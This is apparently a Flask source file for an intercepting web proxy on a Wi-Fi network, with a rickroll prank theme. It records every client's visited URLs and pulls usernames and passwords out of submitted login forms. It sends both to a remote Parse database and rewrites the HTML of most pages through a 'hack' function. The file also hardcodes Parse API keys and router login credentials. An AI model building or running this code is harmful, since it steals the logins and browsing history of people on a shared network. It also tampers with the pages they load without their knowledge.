import os
import re
import json
import requests
import random
from bs4 import BeautifulSoup
from flask import Flask, render_template, send_from_directory, abort, redirect, url_for, request, make_response, Response, stream_with_context, send_file, jsonify
import pyjade
from StringIO import StringIO
from linkreplace import hack

PARSE = "https://api.parse.com/1/"
CLASSES = "classes/"
CLIENT = "Client"
HEADERS = {'X-Parse-Application-Id': 'KNf3x2GGrkFOoRapY8D9y6PkrHKRPlk6FgeWblEF', 'X-Parse-REST-API-Key': 'NFhLdYkpllYLW2Ndw92G8jPx7PuZOgP6CjtqbaF8', 'Content-type': 'application/json'}

USERNAME = ['username', 'user', 'email', 'handle', 'uniqname', 'alias', 'account']
PASSWORD = ['password', 'pass', 'key', 'passkey', 'passphrase', 'secret']

app = Flask(__name__)
# use the jade template engine
app.jinja_env.add_extension('pyjade.ext.jinja.PyJadeExtension')

def get_client_obid(ip):
  params = {'where': json.dumps({'ip': ip})}
  r = requests.get(PARSE + CLASSES + CLIENT, headers=HEADERS, params=params)
  if (r.status_code != 404):
    data = json.loads(r.text)
    if (data.get('results', False)):
      return data['results'][0]['objectId']
  return new_client_from_ip(ip)

def new_client_from_ip(ip):
  data = json.dumps({'ip': ip})
  r = requests.post(PARSE + CLASSES + CLIENT, headers=HEADERS, data=data)
  if (r.status_code != 404):
    obj = json.loads(r.text)
    return obj.get('objectId', '')
  return None

def add_visited(ip, url):
  obid = get_client_obid(ip)
  if obid is None:
    print "Failed to get a Client object!"
    return
  data = json.dumps({"visited":{"__op":"AddUnique","objects":[url]}})
  r = requests.put(PARSE + CLASSES + CLIENT + '/' + obid, headers=HEADERS, data=data)
  if r.status_code == 404:
    print "Error adding visited: %s, %s" % (ip, url)
    print PARSE + CLASSES + CLIENT + '/' + obid
    print r.text
    return False
  return True

def store_credentials(ip, url, u, p):
  obid = get_client_obid(ip)
  if obid is None:
    return
  data = json.dumps({"credentials":{"__op":"AddUnique","objects":[(url, u, p)]}})
  r = requests.put(PARSE + CLASSES + CLIENT + '/' + obid, headers=HEADERS, data=data)
  return True

def insecure_login(form):
  for u in USERNAME:
    for p in PASSWORD:
      ups = [key for key in form.keys() if u in key]
      pws = [key for key in form.keys() if p in key]
      if ups and pws:
        # TODO: multiple handling?
        user = form[ups[0]]
        pasw = form[pws[0]]
        print "Insecure login detected: %s:%s" % (user, pasw)
        return (user, pasw)
  return (None, None)

whitelist = ["youtube.com", "google.com", "googlevideo.com"]

def make_request(url):
  if request.method == "POST":
    r = requests.post(url, params=dict(request.form))
  else:
    r = requests.get(url)
  return r


def get_url(path):
  host = request.headers.get("Host")
  if path.startswith("http://"):
    return path
  return "http://%s/%s" % (host, path)

def simple_rr(url, ip, u=None, p=None):
  obj = {
    "title": "You've been wangernumbed!",
    "url": url,
    "ip": ip,
    "username": u,
    "password": p
  };
  return render_template('rickroll.html', **obj)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
  # get the params
  url = get_url(path)
  print "YOOOOO %s" % url
  ip = request.remote_addr
  # log the visit
  add_visited(ip, url)
  # make their request
  r = make_request(url)
  # if there's a form, check if it's a login
  if request.method == "POST":
    (u, p) = insecure_login(request.form)
    # if we found a username and password
    if (u, p):
      # log that shit
      store_credentials(ip, url, u, p)
      return simple_rr(url, ip, u, p)
  # hack the page if it's not on the whitelist and is actually HTML
  elif url.split("/")[2] not in whitelist and "text/html" in r.headers.get('content-type'):
    return Response(hack(r.text))
  # else stream the content back
  return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/html"))

@app.route('/rickroll')
def rick_roll():
  return simple_rr(None, None)

@app.route('/login')
def login_page():
  return render_template('login.html')

@app.route('/clients')
def wifi_clients():
  r = requests.get("http://192.168.1.1/Status_Lan.live.asp", auth=('doge', 'doge7'))
  return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/json"))

# this guy handles static files
@app.route('/public/<path:filename>')
@app.route('/images/<path:filename>')
def send_pic(filename):
  print "Getting static: %s" % filename
  return send_from_directory('./public/', filename)

@app.route('/favicon.ico')
def ignore():
  return send_pic('wat')

if __name__ == '__main__':
  # Bind to PORT if defined (on production)
  port = int(os.environ.get('PORT', 3000))
  
  app.run(host='0.0.0.0', port=port, debug=True, threaded=False)

